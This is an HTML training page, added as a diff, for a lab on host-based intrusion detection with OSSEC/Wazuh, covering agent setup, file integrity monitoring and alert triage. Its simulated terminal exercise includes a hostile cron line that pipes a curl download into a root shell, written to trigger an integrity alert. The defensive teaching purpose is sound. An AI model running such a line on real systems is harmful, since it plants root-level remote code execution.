@@ -1,0 +1,89 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Lab 16 — IDS Training</title>
+<link rel="stylesheet" href="module-kit.css">
+<script src="labs-access.js"></script>
+<script>LabsAccess.guard('lab16');</script>
+</head>
+<body>
+<div id="app"><noscript><p style="padding:16px">IDS Training needs JavaScript enabled.</p></noscript></div>
+<script src="module-kit.js"></script>
+<script src="questions.js"></script>
+<script src="assessment.js"></script>
+<script>
+ModuleKit.mount({
+  id: 'lab16',
+  briefing: {
+    hook: 'A network sensor sees packets. It can’t see the attacker who already has a shell editing <code>/etc/crontab</code>. That’s the host’s job.',
+    lead: 'A <strong>host-based IDS (HIDS)</strong> runs on the endpoint. <strong>OSSEC</strong> and its widely used fork <strong>Wazuh</strong> combine log analysis, <strong>file integrity monitoring</strong> (syscheck), rootkit and configuration checks, and <strong>active response</strong>. Agents send events to a central manager, which decodes them, matches rules and raises alerts with a level from 0 to 15.',
+    stats: [
+      { value: '0–15', label: 'Rule levels', note: 'Higher = more important. Level 0 is ignored; brute-force rules sit around 10; the top levels are for severe events.' },
+      { value: '43200 s', label: 'Default syscheck interval', note: 'Wazuh scans monitored paths every 12 hours by default — enable <code>realtime</code> for critical directories.' },
+      { value: '1514', label: 'Agent → manager port', note: 'Wazuh agents send events to the manager on 1514/TCP and enrol on 1515/TCP by default.' }
+    ],
+    objectives: [
+      'Explain the manager/agent architecture of OSSEC/Wazuh.',
+      'Install and enrol an agent and check its status.',
+      'Configure file integrity monitoring for critical paths.',
+      'Read HIDS alerts and decide when to use active response.'
+    ],
+    blocks: [{ type: 'myths', items: [
+      { myth: 'File integrity monitoring should watch the whole disk in real time.', fact: 'Watching everything is slow and noisy (logs, caches, temp files change constantly). Monitor binaries, configs and web roots; ignore volatile paths.' },
+      { myth: 'Active response should automatically block every alert.', fact: 'Automated blocking on noisy or spoofable events can lock out real users or be abused by attackers. Use it for high-confidence rules with timeouts.' },
+      { myth: 'An agent that’s installed is an agent that’s reporting.', fact: 'Agents can be disconnected, never enrolled or blocked by a firewall. Check status on the manager regularly.' }
+    ] }]
+  },
+  scenario: {
+    meta: ['Web server fleet', 'Wazuh 4.x', 'Night shift'],
+    title: 'A changed binary at 02:47',
+    story: '<p>At 02:47 Wazuh raises a level-7 alert on <code>web03</code>: “Integrity checksum changed” for <code>/usr/bin/ps</code>. No patching was scheduled. Five minutes earlier the same host logged a successful SSH login for <code>www-data</code>, an account that normally never logs in interactively.</p>',
+    blocks: [
+      { type: 'choice', title: 'Decision — How do you respond?', prompt: 'What is the best interpretation and next step?', options: [
+        { text: 'Treat it as a likely compromise: a replaced system binary after an unusual login suggests a rootkit. Isolate the host, preserve evidence, and investigate from trusted tools.', verdict: 'good', why: 'Trojaned <code>ps</code> is a classic way to hide processes. Don’t trust tools on the host itself.' },
+        { text: 'Check the package manager log; if no update ran, restore <code>ps</code> from the package and carry on.', verdict: 'partial', why: 'Checking for a legitimate update is right, but quietly restoring one binary ignores how the attacker got in and what else they changed.' },
+        { text: 'Lower the rule level for <code>/usr/bin</code> changes — it’s probably an update.', verdict: 'bad', why: 'You would silence exactly the alert that caught a potential rootkit.' }
+      ] }
+    ]
+  },
+  practice: {
+    intro: 'Install an agent, turn on real-time FIM, trigger an alert, then triage FIM events.',
+    blocks: [
+      { type: 'terminal', title: 'Wazuh agent + file integrity monitoring', host: 'student@ubuntu-victim', prompt: '$', motd: 'Wazuh manager is at 10.10.10.40. Wazuh repository already added.', tasks: [
+        { goal: 'Install the agent pointing at the manager: <code>sudo WAZUH_MANAGER=\'10.10.10.40\' apt-get install wazuh-agent</code>', match: /^sudo\s+WAZUH_MANAGER=['"]?10\.10\.10\.40['"]?\s+apt(-get)?\s+install\s+(-y\s+)?wazuh-agent(\s+-y)?$/, hint: "sudo WAZUH_MANAGER='10.10.10.40' apt-get install -y wazuh-agent", output: 'Setting up wazuh-agent (4.x) ...\nManager address set to 10.10.10.40' },
+        { goal: 'Enable and start it', match: /^sudo\s+systemctl\s+enable\s+--now\s+wazuh-agent$/i, hint: 'sudo systemctl enable --now wazuh-agent', output: 'Created symlink … wazuh-agent.service\n● wazuh-agent.service active (running)' },
+        { goal: 'Edit the agent config to add real-time FIM: <code>sudo nano /var/ossec/etc/ossec.conf</code>', match: /^sudo\s+(nano|vi|vim)\s+\/var\/ossec\/etc\/ossec\.conf$/i, hint: 'sudo nano /var/ossec/etc/ossec.conf', output: '[added inside <syscheck>]\n  <directories check_all="yes" realtime="yes" report_changes="yes">/etc,/usr/bin,/usr/sbin</directories>\n  <directories check_all="yes" realtime="yes">/var/www/html</directories>\n  <ignore>/etc/mtab</ignore>\n[saved]', note: 'report_changes shows a diff for text files — useful for configs, avoid on files with secrets.' },
+        { goal: 'Restart the agent to apply', match: /^sudo\s+systemctl\s+restart\s+wazuh-agent$/i, hint: 'sudo systemctl restart wazuh-agent', output: '(restarted)' },
+        { goal: 'Simulate tampering: <code>echo "* * * * * root curl x|sh" | sudo tee -a /etc/crontab</code>', match: /^echo\s+.+\|\s*sudo\s+tee\s+-a\s+\/etc\/crontab$/i, hint: 'echo "* * * * * root curl x|sh" | sudo tee -a /etc/crontab', output: '* * * * * root curl x|sh' },
+        { goal: 'On the manager, read the newest alerts: <code>sudo tail -n 20 /var/ossec/logs/alerts/alerts.log</code>', match: /^sudo\s+tail\s+(-n\s*)?-?\d*\s*\/var\/ossec\/logs\/alerts\/alerts\.log$/i, hint: 'sudo tail -n 20 /var/ossec/logs/alerts/alerts.log', output: '** Alert 1763374021.88231: - ossec,syscheck,syscheck_entry_modified,\n2026 Nov 17 10:47:01 (ubuntu-victim) any->syscheck\nRule: 550 (level 7) -> \'Integrity checksum changed.\'\nFile \'/etc/crontab\' modified\nMode: realtime\nChanged attributes: size,mtime,md5,sha1,sha256\nWhat changed:\n> * * * * * root curl x|sh', note: 'Real-time mode caught it within seconds and the diff shows exactly what was added.' },
+        { goal: 'List agents and their status: <code>sudo /var/ossec/bin/agent_control -l</code>', match: /^sudo\s+\/var\/ossec\/bin\/agent_control\s+-l$/i, hint: 'sudo /var/ossec/bin/agent_control -l', output: 'Wazuh agent_control. List of available agents:\n   ID: 000, Name: wazuh-manager (server), IP: 127.0.0.1, Active/Local\n   ID: 001, Name: ubuntu-victim, IP: any, Active\n   ID: 002, Name: win10-victim, IP: any, Disconnected' , note: 'win10-victim is Disconnected — a blind spot to fix.' }
+      ], extra: [
+        { match: /^sudo\s+\/var\/ossec\/bin\/wazuh-logtest$/i, output: 'Type one log per line\n(simulator) wazuh-logtest lets you test decoders and rules against sample log lines.' }
+      ], success: 'Agent enrolled, real-time FIM on critical paths, a tampering alert with a diff — and you spotted a disconnected agent.' },
+      { type: 'sort', title: 'FIM alert triage', left: 'Expected change', right: 'Suspicious — investigate', intro: 'Context: patching runs Sundays 01:00–02:00 via apt. Web content is deployed by CI as user <code>deploy</code>.', items: [
+        { text: 'Sun 01:14 — <code>/usr/bin/openssl</code> checksum changed; dpkg log shows openssl upgrade at 01:13.', answer: 'left', why: 'Matches the change window and a package manager record.' },
+        { text: 'Wed 02:47 — <code>/usr/bin/ps</code> changed; no package activity.', answer: 'right', why: 'Core utilities replaced outside patching — rootkit behaviour.' },
+        { text: 'Tue 15:02 — new file <code>/var/www/html/assets/app.4f9c.js</code> owned by deploy, matching a CI job.', answer: 'left', why: 'Normal deployment by the expected account and pipeline.' },
+        { text: 'Thu 23:10 — new file <code>/var/www/html/uploads/img.php</code> owned by www-data.', answer: 'right', why: 'A PHP file appearing in an uploads folder is a classic web shell.' },
+        { text: 'Fri 09:30 — <code>/etc/ssh/sshd_config</code> changed: <code>PermitRootLogin yes</code>.', answer: 'right', why: 'Security-weakening config change; verify against a change ticket.' },
+        { text: 'Sun 01:40 — <code>/etc/ld.so.cache</code> updated during kernel package upgrade.', answer: 'left', why: 'Regenerated automatically by package installs (often worth adding to the ignore list).' }
+      ] }
+    ]
+  },
+  playbook: {
+    rules: [
+      ['Deploy agents everywhere it matters. ', 'Servers first, then workstations — and alert when an agent disconnects.'],
+      ['Monitor what attackers change. ', 'System binaries, <code>/etc</code>, startup/cron locations, web roots — in real time for critical paths.'],
+      ['Ignore the volatile. ', 'Logs, caches and temp directories go on the ignore list to keep FIM meaningful.'],
+      ['Correlate with change management. ', 'An expected change has a ticket or a package-manager record; anything else gets investigated.'],
+      ['Automate response carefully. ', 'Active response for high-confidence rules only, with timeouts and allow-lists.'],
+      ['Test rules with logtest. ', 'Use <code>wazuh-logtest</code> to check decoders and custom rules before deploying them.']
+    ],
+    quote: ['The network tells you someone knocked. The host tells you what they touched inside.']
+  }
+});
+</script>
+</body>
+</html>
